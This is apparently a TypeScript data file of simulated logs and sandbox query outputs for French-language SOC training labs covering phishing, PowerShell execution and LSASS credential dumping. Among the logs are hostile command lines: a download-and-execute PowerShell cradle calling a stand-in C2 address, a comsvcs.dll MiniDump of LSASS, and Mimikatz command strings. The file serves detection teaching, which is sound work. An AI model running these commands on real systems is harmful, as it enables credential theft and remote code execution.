/**
 * Sandbox Logs - Données pour les labs pratiques
 * Ces logs simulés correspondent aux scénarios des TP
 */

export interface LogEntry {
  timestamp: string;
  source: string;
  level: "info" | "warning" | "error" | "critical";
  message: string;
  raw?: string;
  metadata?: Record<string, string | number>;
}

// ============================================
// LOGS POUR TP PHISHING
// ============================================
export const phishingEmailHeaders = `From: security@bnp-verification.com
To: marie.dupont@entreprise.fr
Subject: URGENT: Vérification de vos coordonnées bancaires
Date: Tue, 04 Mar 2026 09:15:23 +0000
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="----=_Part_12345"
Return-Path: <admin@mail.suspicious-server.ru>
Message-ID: <abc123def456@mail.suspicious-server.ru>
X-Originating-IP: [185.234.72.45]
X-Mailer: PHPMailer 5.2.9
Received: from mail.suspicious-server.ru (185.234.72.45) 
    by mx.entreprise.fr (Postfix) with ESMTP id 4F7B82001F3
    for <marie.dupont@entreprise.fr>; Tue, 04 Mar 2026 09:15:25 +0000 (UTC)
Received: from localhost (unknown [10.0.0.1])
    by mail.suspicious-server.ru (Postfix) with ESMTP id 3E8A91002B1
    Tue, 04 Mar 2026 12:15:22 +0300 (MSK)
Authentication-Results: mx.entreprise.fr;
    spf=fail (sender IP is 185.234.72.45) smtp.mailfrom=bnp-verification.com;
    dkim=none (message not signed);
    dmarc=fail action=none header.from=bnp-verification.com;
X-Spam-Status: Yes, score=8.5 required=5.0
X-Spam-Score: 85`;

export const phishingProxyLogs: LogEntry[] = [
  {
    timestamp: "2026-03-04T09:23:15.234Z",
    source: "proxy",
    level: "warning",
    message: "HTTPS connection to newly registered domain",
    metadata: {
      user: "marie.dupont",
      workstation: "WKS-FIN-042",
      destination_ip: "104.21.45.123",
      destination_domain: "bnp-verification.com",
      url: "https://bnp-verification.com/secure/login.php",
      category: "Newly Registered Domain",
      bytes_sent: 342,
      bytes_received: 15678,
      user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
    },
    raw: `2026-03-04 09:23:15 WKS-FIN-042 marie.dupont CONNECT 200 TCP_MISS 15678 342 https://bnp-verification.com/secure/login.php - DIRECT/104.21.45.123 text/html "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0" NEWLY_REGISTERED_DOMAIN`
  },
  {
    timestamp: "2026-03-04T09:23:16.892Z",
    source: "proxy",
    level: "warning",
    message: "Form submission to suspicious domain",
    metadata: {
      user: "marie.dupont",
      workstation: "WKS-FIN-042",
      destination_domain: "bnp-verification.com",
      url: "https://bnp-verification.com/secure/process.php",
      method: "POST",
      content_type: "application/x-www-form-urlencoded",
      bytes_sent: 1245
    },
    raw: `2026-03-04 09:23:16 WKS-FIN-042 marie.dupont POST 200 TCP_MISS 456 1245 https://bnp-verification.com/secure/process.php - DIRECT/104.21.45.123 application/json "Mozilla/5.0"`
  }
];

export const phishingDNSLogs: LogEntry[] = [
  {
    timestamp: "2026-03-04T09:23:14.001Z",
    source: "dns",
    level: "info",
    message: "DNS query for bnp-verification.com",
    metadata: {
      query_type: "A",
      query: "bnp-verification.com",
      response: "104.21.45.123",
      client_ip: "10.50.1.42",
      ttl: 300
    },
    raw: `04-Mar-2026 09:23:14.001 client 10.50.1.42#52341 (bnp-verification.com): query: bnp-verification.com IN A + (10.1.1.1)`
  },
  {
    timestamp: "2026-03-04T09:23:14.156Z",
    source: "dns",
    level: "info",
    message: "DNS response for bnp-verification.com",
    metadata: {
      response_type: "A",
      domain: "bnp-verification.com",
      ip: "104.21.45.123",
      nameserver: "cliff.ns.cloudflare.com"
    },
    raw: `04-Mar-2026 09:23:14.156 query response: bnp-verification.com A 104.21.45.123 from cliff.ns.cloudflare.com TTL:300`
  }
];

export const phishingEDRLogs: LogEntry[] = [
  {
    timestamp: "2026-03-04T09:23:17.445Z",
    source: "edr",
    level: "warning",
    message: "Browser navigated to potential phishing site",
    metadata: {
      hostname: "WKS-FIN-042",
      user: "ENTREPRISE\\marie.dupont",
      process: "chrome.exe",
      pid: 12456,
      url: "https://bnp-verification.com/secure/login.php",
      threat_score: 75,
      detection: "Phishing:HTML/FakeLogin.A"
    },
    raw: `{"timestamp":"2026-03-04T09:23:17.445Z","event_type":"web_navigation","hostname":"WKS-FIN-042","user":"ENTREPRISE\\\\marie.dupont","process_name":"chrome.exe","pid":12456,"url":"https://bnp-verification.com/secure/login.php","threat_intel":{"score":75,"category":"phishing","detection_name":"Phishing:HTML/FakeLogin.A"}}`
  },
  {
    timestamp: "2026-03-04T09:23:18.112Z",
    source: "edr",
    level: "info",
    message: "File downloaded to Downloads folder",
    metadata: {
      hostname: "WKS-FIN-042",
      user: "ENTREPRISE\\marie.dupont",
      process: "chrome.exe",
      file_path: "C:\\Users\\marie.dupont\\Downloads\\verification_form.html",
      file_hash_sha256: "a7f8e4d2c1b9034e56f8a2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3",
      file_size: 34567
    },
    raw: `{"timestamp":"2026-03-04T09:23:18.112Z","event_type":"file_create","hostname":"WKS-FIN-042","file_path":"C:\\\\Users\\\\marie.dupont\\\\Downloads\\\\verification_form.html","sha256":"a7f8e4d2c1b9034e56f8a2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3","size":34567}`
  }
];

// ============================================
// LOGS POUR TP EXECUTION
// ============================================
export const executionEDRLogs: LogEntry[] = [
  {
    timestamp: "2026-03-04T14:32:01.234Z",
    source: "edr",
    level: "critical",
    message: "Suspicious PowerShell execution detected",
    metadata: {
      hostname: "WKS-DEV-015",
      user: "ENTREPRISE\\thomas.martin",
      process: "powershell.exe",
      pid: 7892,
      parent_process: "WINWORD.EXE",
      parent_pid: 5634,
      command_line: "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABO..."
    },
    raw: `{"timestamp":"2026-03-04T14:32:01.234Z","event_type":"process_create","hostname":"WKS-DEV-015","process":{"name":"powershell.exe","pid":7892,"command_line":"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4ANQAwAC4AMQAuADEAMAAwADoAOAAwADgAMAAvAHAAYQB5AGwAbwBhAGQAJwApAA=="},"parent":{"name":"WINWORD.EXE","pid":5634}}`
  },
  {
    timestamp: "2026-03-04T14:32:02.567Z",
    source: "edr",
    level: "critical",
    message: "Network connection from PowerShell",
    metadata: {
      hostname: "WKS-DEV-015",
      process: "powershell.exe",
      pid: 7892,
      destination_ip: "10.50.1.100",
      destination_port: 8080,
      protocol: "TCP"
    },
    raw: `{"timestamp":"2026-03-04T14:32:02.567Z","event_type":"network_connect","hostname":"WKS-DEV-015","process_name":"powershell.exe","pid":7892,"remote_ip":"10.50.1.100","remote_port":8080,"protocol":"TCP","direction":"outbound"}`
  },
  {
    timestamp: "2026-03-04T14:32:05.891Z",
    source: "edr",
    level: "critical",
    message: "Suspicious file creation in temp directory",
    metadata: {
      hostname: "WKS-DEV-015",
      process: "powershell.exe",
      pid: 7892,
      file_path: "C:\\Users\\thomas.martin\\AppData\\Local\\Temp\\svchost.exe",
      file_hash_sha256: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
    },
    raw: `{"timestamp":"2026-03-04T14:32:05.891Z","event_type":"file_create","hostname":"WKS-DEV-015","process_name":"powershell.exe","file_path":"C:\\\\Users\\\\thomas.martin\\\\AppData\\\\Local\\\\Temp\\\\svchost.exe","sha256":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"}`
  }
];

export const executionWindowsLogs: LogEntry[] = [
  {
    timestamp: "2026-03-04T14:32:01.100Z",
    source: "windows",
    level: "warning",
    message: "PowerShell Script Block Logging - Event 4104",
    metadata: {
      event_id: 4104,
      hostname: "WKS-DEV-015",
      script_block: "IEX (New-Object Net.WebClient).DownloadString('http://10.50.1.100:8080/payload')"
    },
    raw: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" />
    <EventID>4104</EventID>
    <TimeCreated SystemTime="2026-03-04T14:32:01.100Z" />
    <Computer>WKS-DEV-015</Computer>
  </System>
  <EventData>
    <Data Name="ScriptBlockText">IEX (New-Object Net.WebClient).DownloadString('http://10.50.1.100:8080/payload')</Data>
    <Data Name="ScriptBlockId">a1b2c3d4-e5f6-7890-abcd-ef1234567890</Data>
  </EventData>
</Event>`
  },
  {
    timestamp: "2026-03-04T14:32:01.050Z",
    source: "windows",
    level: "info",
    message: "Process Creation - Event 4688",
    metadata: {
      event_id: 4688,
      hostname: "WKS-DEV-015",
      new_process: "powershell.exe",
      creator_process: "WINWORD.EXE",
      command_line: "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3..."
    },
    raw: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing" />
    <EventID>4688</EventID>
    <TimeCreated SystemTime="2026-03-04T14:32:01.050Z" />
    <Computer>WKS-DEV-015</Computer>
  </System>
  <EventData>
    <Data Name="NewProcessName">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
    <Data Name="ParentProcessName">C:\\Program Files\\Microsoft Office\\WINWORD.EXE</Data>
    <Data Name="CommandLine">powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...</Data>
  </EventData>
</Event>`
  }
];

// ============================================
// LOGS POUR TP CREDENTIAL ACCESS
// ============================================
export const credentialAccessEDRLogs: LogEntry[] = [
  {
    timestamp: "2026-03-04T22:15:33.456Z",
    source: "edr",
    level: "critical",
    message: "LSASS memory access detected",
    metadata: {
      hostname: "SRV-DC-01",
      user: "ENTREPRISE\\admin.compromis",
      source_process: "rundll32.exe",
      target_process: "lsass.exe",
      access_type: "PROCESS_VM_READ",
      detection: "Credential Access:T1003.001"
    },
    raw: `{"timestamp":"2026-03-04T22:15:33.456Z","event_type":"credential_access","hostname":"SRV-DC-01","source_process":{"name":"rundll32.exe","pid":4532,"command_line":"rundll32.exe C:\\\\Windows\\\\Temp\\\\comsvcs.dll, MiniDump 672 C:\\\\Windows\\\\Temp\\\\lsass.dmp full"},"target_process":{"name":"lsass.exe","pid":672},"access_rights":"PROCESS_VM_READ|PROCESS_QUERY_INFORMATION","threat_intel":{"mitre_technique":"T1003.001","severity":"critical"}}`
  },
  {
    timestamp: "2026-03-04T22:15:34.789Z",
    source: "edr",
    level: "critical",
    message: "LSASS dump file created",
    metadata: {
      hostname: "SRV-DC-01",
      process: "rundll32.exe",
      file_path: "C:\\Windows\\Temp\\lsass.dmp",
      file_size: 52428800
    },
    raw: `{"timestamp":"2026-03-04T22:15:34.789Z","event_type":"file_create","hostname":"SRV-DC-01","process_name":"rundll32.exe","file_path":"C:\\\\Windows\\\\Temp\\\\lsass.dmp","file_size":52428800,"file_type":"memory_dump"}`
  },
  {
    timestamp: "2026-03-04T22:16:01.234Z",
    source: "edr",
    level: "critical",
    message: "Mimikatz-like behavior detected",
    metadata: {
      hostname: "SRV-DC-01",
      process: "powershell.exe",
      detection: "HackTool:Win64/Mimikatz",
      severity: "critical"
    },
    raw: `{"timestamp":"2026-03-04T22:16:01.234Z","event_type":"behavioral_detection","hostname":"SRV-DC-01","detection_name":"HackTool:Win64/Mimikatz","process_name":"powershell.exe","indicators":["sekurlsa::logonpasswords","privilege::debug","token::elevate"]}`
  }
];

export const credentialAccessWindowsLogs: LogEntry[] = [
  {
    timestamp: "2026-03-04T22:15:33.100Z",
    source: "windows",
    level: "critical",
    message: "Special Privileges Assigned - Event 4672",
    metadata: {
      event_id: 4672,
      hostname: "SRV-DC-01",
      user: "ENTREPRISE\\admin.compromis",
      privileges: "SeDebugPrivilege"
    },
    raw: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing" />
    <EventID>4672</EventID>
    <TimeCreated SystemTime="2026-03-04T22:15:33.100Z" />
    <Computer>SRV-DC-01</Computer>
  </System>
  <EventData>
    <Data Name="SubjectUserName">admin.compromis</Data>
    <Data Name="SubjectDomainName">ENTREPRISE</Data>
    <Data Name="PrivilegeList">SeDebugPrivilege</Data>
  </EventData>
</Event>`
  },
  {
    timestamp: "2026-03-04T22:15:33.200Z",
    source: "windows",
    level: "critical", 
    message: "Process Access - Event 10 (Sysmon)",
    metadata: {
      event_id: 10,
      source: "Sysmon",
      source_process: "rundll32.exe",
      target_process: "lsass.exe",
      granted_access: "0x1410"
    },
    raw: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" />
    <EventID>10</EventID>
    <TimeCreated SystemTime="2026-03-04T22:15:33.200Z" />
    <Computer>SRV-DC-01</Computer>
  </System>
  <EventData>
    <Data Name="SourceProcessId">4532</Data>
    <Data Name="SourceImage">C:\\Windows\\System32\\rundll32.exe</Data>
    <Data Name="TargetProcessId">672</Data>
    <Data Name="TargetImage">C:\\Windows\\System32\\lsass.exe</Data>
    <Data Name="GrantedAccess">0x1410</Data>
    <Data Name="CallTrace">C:\\Windows\\SYSTEM32\\ntdll.dll+9c524|C:\\Windows\\System32\\KERNELBASE.dll+2c0be</Data>
  </EventData>
</Event>`
  }
];

// ============================================
// SANDBOX COMMAND RESULTS
// ============================================
export interface SandboxCommand {
  command: string;
  description: string;
  output: string;
  delay?: number; // ms to simulate execution time
}

export const sandboxCommands: Record<string, SandboxCommand[]> = {
  "tp-phishing": [
    {
      command: 'source.ip: "185.234.72.45"',
      description: "Recherche Kibana pour l'IP source",
      output: `Found 3 results:
---------------------------------------------
[2026-03-04 09:15:25] mx.entreprise.fr - SMTP - Received email from 185.234.72.45 to marie.dupont@entreprise.fr
[2026-03-04 09:23:15] proxy - CONNECT - 185.234.72.45 -> bnp-verification.com
[2026-03-04 09:23:17] edr - WEB_NAVIGATION - chrome.exe accessing bnp-verification.com`,
      delay: 800
    },
    {
      command: "whois bnp-verification.com",
      description: "WHOIS du domaine suspect",
      output: `Domain Name: BNP-VERIFICATION.COM
Registrar: NAMECHEAP INC
Creation Date: 2026-03-01T00:00:00Z  <-- DOMAIN CREATED 3 DAYS AGO!
Registrant Organization: REDACTED FOR PRIVACY
Registrant Country: PA (Panama)
Name Server: CLIFF.NS.CLOUDFLARE.COM
Name Server: KARA.NS.CLOUDFLARE.COM

⚠️ ALERT: Domain registered only 3 days ago - Highly suspicious!`,
      delay: 1200
    },
    {
      command: "curl -s 'https://www.virustotal.com/api/v3/domains/bnp-verification.com'",
      description: "Vérification VirusTotal",
      output: `{
  "data": {
    "attributes": {
      "last_analysis_stats": {
        "malicious": 12,
        "suspicious": 5,
        "harmless": 48,
        "undetected": 15
      },
      "categories": {
        "Fortinet": "phishing",
        "sophos": "malware",
        "BitDefender": "phishing"
      },
      "creation_date": 1709251200,
      "reputation": -45
    }
  }
}

⚠️ DETECTION: 12 vendors detected as MALICIOUS (phishing)`,
      delay: 1500
    },
    {
      command: 'email.subject: "URGENT" AND email.from: "*verification*"',
      description: "Recherche d'autres victimes",
      output: `Found 7 results:
---------------------------------------------
[2026-03-04 09:12:01] jean.bernard@entreprise.fr - Same email - NOT CLICKED
[2026-03-04 09:14:23] sophie.leclerc@entreprise.fr - Same email - NOT CLICKED  
[2026-03-04 09:15:23] marie.dupont@entreprise.fr - Same email - CLICKED ⚠️
[2026-03-04 09:18:45] paul.durand@entreprise.fr - Same email - NOT CLICKED
[2026-03-04 09:21:12] anne.martin@entreprise.fr - Same email - NOT CLICKED
[2026-03-04 09:25:34] luc.petit@entreprise.fr - Same email - NOT CLICKED
[2026-03-04 09:28:56] claire.robert@entreprise.fr - Same email - NOT CLICKED

Summary: 7 users targeted, 1 click detected (marie.dupont)`,
      delay: 1000
    },
    {
      command: "sha256sum verification_form.html",
      description: "Hash du fichier attaché",
      output: `a7f8e4d2c1b9034e56f8a2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3  verification_form.html

VirusTotal lookup for this hash:
Detection: 28/72 (38.9%) - MALICIOUS
Signatures: HTML/Phish.BankFr, Phishing.HTML.FakeBNP, Trojan.HTML.Phishing`,
      delay: 900
    }
  ],
  "tp-execution": [
    {
      command: 'process.name: "powershell.exe" AND process.parent.name: "WINWORD.EXE"',
      description: "Détection de PowerShell lancé par Word",
      output: `Found 1 result:
---------------------------------------------
[2026-03-04 14:32:01] WKS-DEV-015
  Process: powershell.exe (PID: 7892)
  Parent: WINWORD.EXE (PID: 5634)
  User: ENTREPRISE\\thomas.martin
  Command: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi...
  
⚠️ CRITICAL: Office application spawning PowerShell is highly suspicious!`,
      delay: 800
    },
    {
      command: "echo 'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4ANQAwAC4AMQAuADEAMAAwADoAOAAwADgAMAAvAHAAYQB5AGwAbwBhAGQAJwApAA==' | base64 -d",
      description: "Décodage de la commande Base64",
      output: `IEX (New-Object Net.WebClient).DownloadString('http://10.50.1.100:8080/payload')

⚠️ DECODED: PowerShell downloading and executing remote payload!
   - Downloads from: http://10.50.1.100:8080/payload
   - IEX = Invoke-Expression (immediate execution)
   - Classic fileless malware pattern`,
      delay: 600
    },
    {
      command: 'destination.ip: "10.50.1.100" AND destination.port: 8080',
      description: "Recherche des connexions au C2",
      output: `Found 5 results:
---------------------------------------------
[2026-03-04 14:32:02] WKS-DEV-015 -> 10.50.1.100:8080 (PowerShell) - GET /payload
[2026-03-04 14:32:08] WKS-DEV-015 -> 10.50.1.100:8080 (svchost.exe) - POST /beacon
[2026-03-04 14:33:15] WKS-DEV-015 -> 10.50.1.100:8080 (svchost.exe) - POST /beacon
[2026-03-04 14:34:22] WKS-DEV-015 -> 10.50.1.100:8080 (svchost.exe) - POST /beacon
[2026-03-04 14:35:30] WKS-DEV-015 -> 10.50.1.100:8080 (svchost.exe) - POST /beacon

⚠️ PATTERN: Regular beaconing every ~60 seconds = C2 communication!`,
      delay: 1000
    },
    {
      command: 'host.name: "WKS-DEV-015" AND file.path: "*Temp*" AND event.action: "creation"',
      description: "Fichiers créés dans Temp",
      output: `Found 2 results:
---------------------------------------------
[2026-03-04 14:32:05] C:\\Users\\thomas.martin\\AppData\\Local\\Temp\\svchost.exe
  Size: 287,744 bytes
  SHA256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
  Signed: No
  
[2026-03-04 14:32:06] C:\\Users\\thomas.martin\\AppData\\Local\\Temp\\config.dat
  Size: 1,024 bytes (Encrypted C2 config)

⚠️ MALWARE: Fake svchost.exe dropped in user temp folder!`,
      delay: 900
    }
  ],
  "tp-credential-access": [
    {
      command: 'event.code: 10 AND winlog.event_data.TargetImage: "*lsass.exe"',
      description: "Sysmon Event 10 - Accès à LSASS",
      output: `Found 1 result:
---------------------------------------------
[2026-03-04 22:15:33] SRV-DC-01 (Domain Controller)
  Event: Sysmon Event ID 10 - ProcessAccess
  Source: rundll32.exe (PID: 4532)
  Target: lsass.exe (PID: 672)
  GrantedAccess: 0x1410 (PROCESS_QUERY_INFORMATION | PROCESS_VM_READ)
  User: ENTREPRISE\\admin.compromis
  
⚠️ CRITICAL: Memory read access to LSASS = Credential dumping attempt!`,
      delay: 800
    },
    {
      command: 'event.code: 4672 AND winlog.event_data.PrivilegeList: "*SeDebugPrivilege*"',
      description: "Recherche de SeDebugPrivilege",
      output: `Found 3 results:
---------------------------------------------
[2026-03-04 22:15:33] SRV-DC-01 - admin.compromis - SeDebugPrivilege assigned ⚠️
[2026-03-04 08:00:01] SRV-DC-01 - SYSTEM - SeDebugPrivilege (normal - boot)
[2026-03-04 08:00:01] SRV-DC-01 - LOCAL SERVICE - SeDebugPrivilege (normal)

⚠️ SUSPICIOUS: User account requesting SeDebugPrivilege is abnormal!`,
      delay: 700
    },
    {
      command: 'host.name: "SRV-DC-01" AND file.extension: "dmp"',
      description: "Recherche de fichiers dump",
      output: `Found 1 result:
---------------------------------------------
[2026-03-04 22:15:34] C:\\Windows\\Temp\\lsass.dmp
  Created by: rundll32.exe (comsvcs.dll MiniDump)
  Size: 52,428,800 bytes (50 MB)
  User: ENTREPRISE\\admin.compromis
  
⚠️ CRITICAL: LSASS memory dump created - Credentials likely extracted!`,
      delay: 900
    },
    {
      command: 'user.name: "admin.compromis" AND event.action: "logon" | stats count by source.ip',
      description: "D'où viennent les connexions de l'attaquant",
      output: `source.ip           | count
--------------------|-------
10.50.1.100         | 12     ⚠️ C2 Server!
192.168.1.45        | 3      (Admin workstation - compromised?)
10.50.2.15          | 1      (Jump server)

⚠️ Multiple logins from C2 server IP = Attacker's access point`,
      delay: 1100
    },
    {
      command: 'process.command_line: "*sekurlsa*" OR process.command_line: "*mimikatz*"',
      description: "Recherche Mimikatz",
      output: `Found 2 results:
---------------------------------------------
[2026-03-04 22:16:01] SRV-DC-01 - powershell.exe
  Detected strings: "sekurlsa::logonpasswords", "privilege::debug"
  Detection: HackTool:Win64/Mimikatz
  
[2026-03-04 22:16:15] SRV-DC-01 - powershell.exe  
  Detected strings: "lsadump::dcsync", "token::elevate"
  
⚠️ MIMIKATZ CONFIRMED: Both memory dumping and DCSync detected!`,
      delay: 1000
    }
  ]
};

// Get logs for a specific lab
export const getLogsForLab = (labId: string): Record<string, LogEntry[]> => {
  switch (labId) {
    case "tp-phishing":
      return {
        "Email Headers": phishingEmailHeaders as any,
        "Proxy Logs": phishingProxyLogs,
        "DNS Logs": phishingDNSLogs,
        "EDR Logs": phishingEDRLogs
      };
    case "tp-execution":
      return {
        "EDR Logs": executionEDRLogs,
        "Windows Events": executionWindowsLogs
      };
    case "tp-credential-access":
      return {
        "EDR Logs": credentialAccessEDRLogs,
        "Windows Events": credentialAccessWindowsLogs
      };
    default:
      return {};
  }
};
